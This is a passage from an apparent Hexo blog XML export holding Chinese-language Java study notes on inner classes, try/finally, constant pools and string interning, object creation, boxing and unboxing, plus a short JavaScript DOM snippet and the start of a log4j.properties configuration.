4.静态内部类（对外直接可见，可以直接创建对象）</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Like3</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Like like;</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> TestLambda().<span class="function">new <span class="title">Like2</span><span class="params">()</span></span>;    <span class="comment">// 创建非静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> Like3();     <span class="comment">//  创建静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="忘记点5：try中有return，finally还会执行吗"><a href="#忘记点5：try中有return，finally还会执行吗" class="headerlink" title="忘记点5：try中有return，finally还会执行吗"></a>忘记点5：try中有return，finally还会执行吗</h2><p>答案是肯定的，java官方文档是这么描述的：</p>
<blockquote>
<p>​    The <code>finally</code> block <em>always</em> executes when the <code>try</code> block exits.`</p>
</blockquote>
<p>即try执行完成之后，finally一定会执行的。这个特性可以让程序员避免在try语句中使用了return，continue或者break关键字而忽略了关闭相关资源的操作。把清理相关资源放在finally语句块中一直是最佳实践。</p>
<p>更详解释：<a href="https://blog.csdn.net/Hningning/article/details/104506944/">(10条消息) try中有return，finally还会执行吗？_Hningning的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>匿名内部类</tag>
        <tag>super</tag>
        <tag>this</tag>
        <tag>static</tag>
        <tag>try中的return</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（3）——java的常量池的理解</title>
    <url>/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94java%E7%9A%84%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="java执行类的阶段划分"><a href="#java执行类的阶段划分" class="headerlink" title="java执行类的阶段划分"></a>java执行类的阶段划分</h2><span id="more"></span>

<p>jvm在执行某个类的时候，必须经过<strong>加载</strong>、<strong>连接</strong>、<strong>初始化</strong>，而连接又包括<strong>验证</strong>、<strong>准备</strong>、<strong>解析</strong>三个阶段。</p>
<p><img src="https://i.loli.net/2021/10/23/kHBcp5PF6h2ZdLz.png" alt="image-20211023174945692"></p>
<h2 id="常量池分类"><a href="#常量池分类" class="headerlink" title="常量池分类"></a>常量池分类</h2><p>常量池可分为三类：class文件常量池、运行时常量池、全局字符串池</p>
<ol>
<li><strong>class文件常量池（class constant pool）：</strong></li>
</ol>
<ul>
<li><strong>出现时间：</strong>在类<strong>加载之前</strong>就存在于class文件中了</li>
<li><strong>存放内容：</strong>对象的符号引用值</li>
<li>存放在class文件中</li>
<li>class常量池中存放的是字面量和符号引用，也就是说它们存的不是对象的实例，而是对象的符号引用值</li>
</ul>
<ol start="2">
<li><strong>运行时常量池（runtime constant pool）：</strong>通常所说的常量池，指的就是运行时常量池 </li>
</ol>
<ul>
<li><strong>出现时间：</strong>在类加载之后</li>
<li><strong>存放内容：</strong>对象的符号引用值，经过解析阶段后，替换为直接引用</li>
<li>在class文件被加载进了内存之后，常量池保存在了方法区中，所以，<strong>每一个类都有一个运行时常量池</strong></li>
<li>在class文件加载之后，jvm就会将class常量池中的<strong>符号引用解析后，<u>替换为直接引用</u>，</strong>存放到运行时常量池中（也就是符号引用）</li>
</ul>
<ol start="3">
<li><strong>全局字符串池（String pool或者String literal poll）：</strong></li>
</ol>
<ul>
<li><strong>出现时间：</strong>在准备阶段之后（因为解析阶段运行时常量池需要查询全局字符串）</li>
<li><strong>存放内容：</strong>驻留字符串的引用</li>
<li>在类加载完成，经过验证，准备阶段之后，在堆中生成字符串对象实例之后，再将<strong>该字符串对象实例的引用值</strong>存到string pool中。</li>
<li>string pool的功能由谁实现？由StringTable类实现，它是一个哈希表，里面存的是驻留字符串的引用，可以依据它找到堆中的字符串实例</li>
<li>这个StringTable在每个htoSpot  VM 的实例只有一份，也就是说它<strong>被所有的类共享</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/10/23/Q3Cye58TvcFBI7L.png" alt="image-20211023224256460"></p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;def&quot;</span>);</span><br><span class="line">String str3 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">String str4 = str2.intern();</span><br><span class="line">String str5 = <span class="string">&quot;def&quot;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(str1 == str3);<span class="comment">//true</span></span><br><span class="line">System.out.println(str2 == str4);<span class="comment">//false</span></span><br><span class="line">System.out.println(str4 == str5);<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>上面的例子虽然简单，但是，几种情况都已经囊括在内了</p>
<h3 id="分析第一句"><a href="#分析第一句" class="headerlink" title="分析第一句"></a>分析第一句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，首先，会在堆中生成一个“abc”实例；然后全局StringTable中存放着“abc”的引用值</p>
<h3 id="分析第二句（注意点）"><a href="#分析第二句（注意点）" class="headerlink" title="分析第二句（注意点）"></a>分析第二句（注意点）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;def&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，首先，会在堆中生成一个“def”实例；然后全局StringTable中存放着“def”的引用值；接着，new 出来一个”def“的实例（这两个实例不是同一个）；</p>
<p><strong>生成了两个对象实例！！！</strong></p>
<p><strong>生成了两个对象实例！！！</strong></p>
<p><strong>生成了两个对象实例！！！</strong></p>
<p><img src="https://i.loli.net/2021/10/23/uOVLGdvJUoc6n2f.png" alt="image-20211023183033844"></p>
<p><strong>反编译后可以看到，该语句产生了两个实例</strong></p>
<p><strong>重点：</strong>new出来的字符串实例，和在全局字符串值中对应的那个字符串实例，是不同的实例</p>
<h3 id="分析第三句"><a href="#分析第三句" class="headerlink" title="分析第三句"></a>分析第三句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str3 = <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，进行解析，会在StringTable里面找到”abc”的全局驻留字符串引用，所以str3的引用地址与之前的那个已存在的相同</p>
<h3 id="分析第四句（关键是intern函数）"><a href="#分析第四句（关键是intern函数）" class="headerlink" title="分析第四句（关键是intern函数）"></a>分析第四句（关键是intern函数）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str4 = str2.intern();</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，str4是在运行的时候调用**<code>intern()函数</code>**，返回StringTable中”def”的引用值，如果没有就将str2的引用值添加进去，在这里，StringTable中已经有了”def”的引用值了，所以返回上面在new str2的时候添加到StringTable中的 “def”引用值</p>
<p><img src="https://i.loli.net/2021/10/23/Lv9Wh2H74ZwSAkg.png" alt="image-20211023183338749"></p>
<p><strong>分析反编译后的代码，可以看到，该语句并没有生成新的字符串对象</strong></p>
<h3 id="分析第五句"><a href="#分析第五句" class="headerlink" title="分析第五句"></a>分析第五句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str5 = <span class="string">&quot;def&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这一句，在类加载完成后，在这里，由于StringTable中已经有了”def”的引用值了，所以返回上面在new str2的时候添加到StringTable中的 “def”引用值</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>java的常量池主要有这么几个内容：</p>
<ol>
<li>class常量池：①在编译后就有  ②存储的是对象的符号引用</li>
<li>全局字符串池：①在准备阶段后、解析阶段前出现  ②存储的是驻留字符串的引用  ③运行时常量池在解析阶段，要进行查询，确保两个常量池的引用时一致的</li>
<li>运行时常量池：显示class常量池中的引用，解析阶段后替换为对象的直接引用</li>
</ol>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    String b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    String ab = <span class="string">&quot;ab&quot;</span>;</span><br><span class="line">    String c = <span class="string">&quot;a&quot;</span> + <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    String d = a + <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    String e = a + b;</span><br><span class="line">    String a2 = <span class="keyword">new</span> String(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    String ab2 = a2 + b;</span><br><span class="line">    String ab3 = a2 + <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    System.out.println(a == a2);        <span class="comment">//false</span></span><br><span class="line">    System.out.println(ab == c);        <span class="comment">//true</span></span><br><span class="line">    System.out.println(c == d);         <span class="comment">//false</span></span><br><span class="line">    System.out.println(c == e);         <span class="comment">//false</span></span><br><span class="line">    System.out.println(d == e);         <span class="comment">//false</span></span><br><span class="line">    System.out.println(ab2 == ab);      <span class="comment">//false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在上述例子中，得出一下结论：</strong></p>
<p><strong>①直接用引号的（可以有+号进行连接），内容也一样的，引用的就是一个对象</strong></p>
<p><strong>②如果出现类似<code>String c = b + &quot;a&quot;;</code>这样的，那么就是在堆中生成了一个新的对象。</strong></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>今天偶然间看到了韩顺平老师在B站讲String的特性的课程，看完后，忽然间觉得自己这块瞬间好像明朗了</p>
<p>（上面的内容虽然也差不多，但总觉得还是繁琐，好像有哪些地方不透彻）</p>
<p>主要是补充对于下面这一句代码的理解（根据韩顺平老师将它底层分析的理解）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">String b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">String ab = a+b;	<span class="comment">//这句是重点，在这一句的背后，底层做了很多事情</span></span><br><span class="line">String c = <span class="string">&quot;ab&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>不知道为什么韩老师的在调试的时候能够step into进去查看底层执行情况，而我的就不行<img src="https://i.loli.net/2021/12/02/dcZDVwAm6FJUvs4.png" alt="img"></p>
<p>但是不影响理解它</p>
<p>显然执行过下面两句后，在字符串常量池中，分别存储了两个字符串：“a”，“b”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">String b = <span class="string">&quot;b&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后正片开始！</p>
<p>接下来执行：<code>String ab = a + b;</code></p>
<p>其实，这句在底层做了很多事情。</p>
<ol>
<li>先创建了一个空的StringBuilder的对象，这个对象是存储在堆中的（先暂时存储一下字符串数据，主要要使用它的append方法）</li>
<li>然后先向其中追加了“a”（使用的是它的append方法）</li>
<li>然后又向其中追加了“b”（使用的还是它的append方法）</li>
<li>然后执行了（且返回给ab）<code>return new String(value,0,count) </code>（value指的是上面的StringBuilder对象），这样在字符串常量池中就有了“ab”了，同时堆中也new了一个String类型的对象（值就是value中的数据），并且ab就是指向了这个String类型的对象（不是字符串常量池中的）——（这里和是上面的分析第二句是一样的原理）</li>
</ol>
]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>运行时常量池</tag>
        <tag>class常量池</tag>
        <tag>全局字符串池</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（2）——static静态的原理</title>
    <url>/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94static%E9%9D%99%E6%80%81%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="static成员存储位置"><a href="#static成员存储位置" class="headerlink" title="static成员存储位置"></a>static成员存储位置</h2><span id="more"></span>

<p><strong>类的static修饰的成员，在类被加载进方法区的时候，static同时被加载进方法区中</strong></p>
<h3 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h3><h3 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h3>]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>成员可见性</tag>
        <tag>类加载</tag>
        <tag>类释放</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（4）new一个对象，底层做了哪些事情</title>
    <url>/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%884%EF%BC%89%E2%80%94%E2%80%94new%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%BA%95%E5%B1%82%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E4%BA%8B%E6%83%85/</url>
    <content><![CDATA[<h2 id="创建对象过程"><a href="#创建对象过程" class="headerlink" title="创建对象过程"></a>创建对象过程</h2><span id="more"></span>

<p>我们知道：<strong>程序运行最开始，编译器会将.java文件编译为.class文件</strong></p>
<h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;lion&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age = <span class="number">5555</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Lion is eating!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Animal animal1 = <span class="keyword">new</span> Animal();</span><br><span class="line">        Animal animal2 = <span class="keyword">new</span> Animal();</span><br><span class="line">        </span><br><span class="line">        System.out.println(animal1.name == animal2.name);	<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/23/M8jXEIh4KkZSPls.png" alt="image-20211023144946776"></p>
<p>对上面new一个对象（以Animal类为例）流程解释如下（辅助图中解释一块看）：</p>
<ol>
<li>当需要new一个Animal对象时，首先看方法区中，有无Animal.class的模板：<ul>
<li>若无，则通过<a href="https://liu-ruyang.github.io/2021/08/19/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90">类加载器</a>将Animal.class加载进方法区中；同时，Animal中的<a href="">静态成员需要被加载进静态方法区中</a>。</li>
<li>若有,直接进行下一步。</li>
</ul>
</li>
<li>new一个对象，将对象存放在堆中</li>
<li>是否需要一个该对象的引用变量。如果需要，就在栈的栈顶生成一个该对象的引用变量</li>
</ol>
<p><strong>注意：</strong></p>
<p><strong>①上面的Animal1和Animal2由于是局部变量，所以存储在栈中；</strong></p>
<p><strong>②而name、age是成员变量，所以跟随着对象存储在堆中</strong></p>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>在上面的例子中，我们还涉及到了常量池的概念，有关常量池的概念，见博客：<a href="https://liu-ruyang.github.io/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94java%E7%9A%84%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E7%90%86%E8%A7%A3/">java中常量池的理解</a></p>
]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>java基础</tag>
        <tag>new关键字</tag>
        <tag>创建对象</tag>
      </tags>
  </entry>
  <entry>
    <title>Java装箱和拆箱</title>
    <url>/2021/10/16/java%E8%A3%85%E7%AE%B1%E5%92%8C%E6%8B%86%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><span id="more"></span>

<p>简单说</p>
<p><strong>装箱：</strong>装箱就是将基本数据类型转换为包装器类型，通过<strong>valueOf</strong>()函数实现装箱</p>
<p><strong>拆箱：</strong>拆箱就是将包装器类型转换为基本数据类型，通过**×××Value()**函数实现拆箱</p>
<p><strong>自动装箱：</strong>装箱中有一种非显示地装箱，即隐式装箱</p>
<p><strong>自动拆箱：</strong>拆箱中有一种非显示地拆箱，即隐式拆箱</p>
<h3 id="会发生装箱、拆箱的数据类型和包装类型"><a href="#会发生装箱、拆箱的数据类型和包装类型" class="headerlink" title="会发生装箱、拆箱的数据类型和包装类型"></a>会发生装箱、拆箱的数据类型和包装类型</h3><img src="https://i.loli.net/2021/10/16/RqQHhD3mdBe1PvV.png" style="zoom:80%;" />

<h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><p>可以先看原理，再回来自己分析场景</p>
<h3 id="进行传参时，会发生自动装箱和拆箱"><a href="#进行传参时，会发生自动装箱和拆箱" class="headerlink" title="进行传参时，会发生自动装箱和拆箱"></a>进行传参时，会发生自动装箱和拆箱</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    fun(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">(Integer n)</span></span>&#123;		<span class="comment">//会进行自动装箱</span></span><br><span class="line">    System.out.println(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="包装类和基本类型的大小比较"><a href="#包装类和基本类型的大小比较" class="headerlink" title="包装类和基本类型的大小比较"></a>包装类和基本类型的大小比较</h3><ul>
<li>两个都为包装类型，比较的是地址（可能是一个对象，也有可能不是一个对象）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer a = <span class="number">1</span>;        </span><br><span class="line">Integer b = <span class="number">1</span>;</span><br><span class="line">Integer c = <span class="number">888</span>;</span><br><span class="line">Integer d = <span class="number">888</span>;</span><br><span class="line">System.out.println(a.equals(b));	<span class="comment">//true，比较的是内容（包装类型比较建议使用equals）</span></span><br><span class="line">System.out.println(a == b);			<span class="comment">//true，两个是同一个对象，存储在内存中的数组中，包装类型中==比较的是地址</span></span><br><span class="line"></span><br><span class="line">System.out.println(c == d);			<span class="comment">//false，两个虽然数值上相等，但两个是两个对象，==比较的是地址</span></span><br></pre></td></tr></table></figure>

<ul>
<li>两个都为基本数据类型，比较的是数值，并且数值不一样的会自动类型提升</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> e = <span class="number">888</span>;</span><br><span class="line"><span class="keyword">int</span> f = <span class="number">888</span>;</span><br><span class="line">System.out.println(e == f);		<span class="comment">//true，基本数据类型比较的是数值</span></span><br></pre></td></tr></table></figure>

<ul>
<li>一个为包装类型，一个为基本数据类型，先进拆箱，转变为基本数据类型，再比较数值</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer a = <span class="number">1</span>;</span><br><span class="line">System.out.println(a == <span class="number">1</span> ? <span class="string">&quot;等于&quot;</span> : <span class="string">&quot;不等于&quot;</span>);	<span class="comment">//等于</span></span><br></pre></td></tr></table></figure>

<h3 id="包装类型（和基本类型）的运算"><a href="#包装类型（和基本类型）的运算" class="headerlink" title="包装类型（和基本类型）的运算"></a>包装类型（和基本类型）的运算</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">Integer j = <span class="number">2</span>;	<span class="comment">//自动装箱</span></span><br><span class="line">j = j + i;		<span class="comment">//先自动拆箱，再自动装箱</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">888</span>;</span><br><span class="line">Integer c = <span class="number">888</span>;</span><br><span class="line">Integer d = <span class="number">1776</span>;</span><br><span class="line">System.out.println(d == (a + c));		<span class="comment">//true，a+c先将c拆箱，得到基本类型，再将基本类型与包装类型比较，又将包装类型d拆箱，得到两个基础数据类型，两个基本类型进行数值比较</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当数据类型发生转变时，会发生装箱或者拆箱</p>
<p>当运算的时候，也会发生拆箱、再装箱</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>不同数据类型的**×××Value()<strong>和</strong>valueOf()**的底层实现不同</p>
<p>所以，下面以<strong>Integer</strong>为例：</p>
<h3 id="Integer装箱"><a href="#Integer装箱" class="headerlink" title="Integer装箱"></a>Integer装箱</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer a = <span class="number">1</span>;	<span class="comment">//隐式装箱</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="①对生成的class类进行反编译"><a href="#①对生成的class类进行反编译" class="headerlink" title="①对生成的class类进行反编译"></a>①对生成的class类进行反编译</h4><img src="https://i.loli.net/2021/10/16/qOka5gSH1KZe2tb.png" alt="image-20211016175456093" style="zoom: 67%;" />

<p>可以看到调用了**Integer.valueOf()**方法，执行了装箱</p>
<h4 id="②查看底层源码"><a href="#②查看底层源码" class="headerlink" title="②查看底层源码"></a>②查看底层源码</h4><img src="https://i.loli.net/2021/10/16/7hA4R1MiIkPryts.png" alt="image-20211016175855871" style="zoom:80%;" />

<p><strong>解释：</strong>在Integer装箱时，如果值<strong>在-128到127之间</strong>，则会从内存中的<strong>IntegerCache.cache[]数组</strong>中找到现成的数据，以供使用（这个数组中的数据是Integer类的static静态代码块中初始过的，所以程序一运行时，这些数据就在内存中存在了）；<strong>反之</strong>，如果数值<strong>在-128到127之外</strong>，则会重新new一个Integer类型的对象出来（也就出现了地址值不一样的现象）</p>
<h3 id="Integer拆箱"><a href="#Integer拆箱" class="headerlink" title="Integer拆箱"></a>Integer拆箱</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer a = <span class="number">1</span>;		<span class="comment">//隐式装箱</span></span><br><span class="line">        <span class="keyword">int</span> b = a;			<span class="comment">//隐式拆箱</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="①对生成的class类进行反编译-1"><a href="#①对生成的class类进行反编译-1" class="headerlink" title="①对生成的class类进行反编译"></a>①对生成的class类进行反编译</h4><img src="https://i.loli.net/2021/10/16/ovxU4sSNOYPfWbi.png" alt="image-20211016180904308" style="zoom:67%;" />

<p>可以看到，调用了**Integer.intValue()**方法，执行了拆箱</p>
<h4 id="②查看底层源码-1"><a href="#②查看底层源码-1" class="headerlink" title="②查看底层源码"></a>②查看底层源码</h4><p><img src="https://i.loli.net/2021/10/16/HYNfkFoyM4rZiel.png" alt="image-20211016181054704"></p>
<img src="https://i.loli.net/2021/10/16/kRnvgIBJOSHVPEz.png" alt="image-20211016181437555" style="zoom:80%;" />

<p><strong>解释：</strong>可以看到，只返回了一个value，这个value其实是Integer的一个成员属性，value的值就是等于装箱的时候new Integer()时候的传入的int基本类型的值（数值），所以拆箱的时候，就是把包装类型的数据转换为基本类型数据</p>
<h3 id="推广其他包装类"><a href="#推广其他包装类" class="headerlink" title="推广其他包装类"></a>推广其他包装类</h3><p>其他包装类和Integer类似，也都时通过是否new一个新的对象，来实现装箱、拆箱</p>
<h2 id="装箱、拆箱目的"><a href="#装箱、拆箱目的" class="headerlink" title="装箱、拆箱目的"></a>装箱、拆箱目的</h2><ol>
<li>自动装箱、拆箱，有助于避免错误的发生：因为将包装类型的对象和基本数据类型进行转换时，自动装箱总是生成一个正确的对象，自动拆箱总是生成一个正确的值</li>
<li>有助于减少内存的浪费：例如Integer类的底层中有一个数组存放一定量的值</li>
</ol>
<h2 id="思考：装箱、拆箱的本质"><a href="#思考：装箱、拆箱的本质" class="headerlink" title="思考：装箱、拆箱的本质"></a>思考：装箱、拆箱的本质</h2><p>装箱和拆箱的本质好像就是值类型和引用类型的互相转换。</p>
<p><strong>装箱是值类型转换为引用类型；</strong></p>
<p><strong>拆箱就是引用类型转换为值类型。</strong></p>
<p><strong>tips：</strong></p>
<p><strong>java中除了int等基本数据类型是值类型外，其余所有的类型都称为引用类型（数组，类，接口，字符串）</strong></p>
]]></content>
      <tags>
        <tag>Java基础</tag>
        <tag>装箱、拆箱</tag>
        <tag>值类型、引用类型</tag>
      </tags>
  </entry>
  <entry>
    <title>js创建、插入节点</title>
    <url>/2023/06/21/js%E5%88%9B%E5%BB%BA%E3%80%81%E6%8F%92%E5%85%A5%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<h2 id="JavaScript中和插入节点"><a href="#JavaScript中和插入节点" class="headerlink" title="JavaScript中和插入节点"></a>JavaScript中和插入节点</h2><span id="more"></span>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建节点元素节点</span></span><br><span class="line"><span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line"><span class="comment">// 2. 添加节点 node.appendChild(child)  node 父级  child 是子级 后面追加元素  类似于数组中的push</span></span><br><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">ul.appendChild(li);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 添加节点 node.insertBefore(child, 指定元素);</span></span><br><span class="line"><span class="keyword">var</span> lili = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">ul.insertBefore(lili, ul.children[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>总思路：我们想要页面添加一个新的元素 ：</p>
<ol>
<li>创建元素 </li>
<li>添加元素</li>
</ol>
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j.properties的配置</title>
    <url>/2021/10/26/log4j-properties%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="log4j的常用配置"><a href="#log4j的常用配置" class="headerlink" title="log4j的常用配置"></a>log4j的常用配置</h2><span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### 全局日志等级配置,输出标准设置 ###  </span><br><span class="line">log4j.rootLogger&#x3D;debug,stdout,DDD,EEE  </span><br><span class="line">### 输出信息到控制台 ###  </span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender  </span><br><span class="line">log4j.appender.stdout.Target&#x3D;System.out  </span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;[%-5p] %d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; method:%l%n%m%n  </span><br><span class="line">### 输出DEBUG 级别以上的日志到&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;debug.log ###  </span><br><span class="line">log4j.appender.DDD&#x3D;org.apache.log4j.DailyRollingFileAppender  </span><br><span class="line">log4j.appender.DDD.File&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;debug.log  </span><br><span class="line">log4j.appender.DDD.Append&#x3D;true  </span><br><span class="line">log4j.appender.DDD.Threshold&#x3D;DEBUG  </span><br><span class="line">log4j.appender.DDD.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span 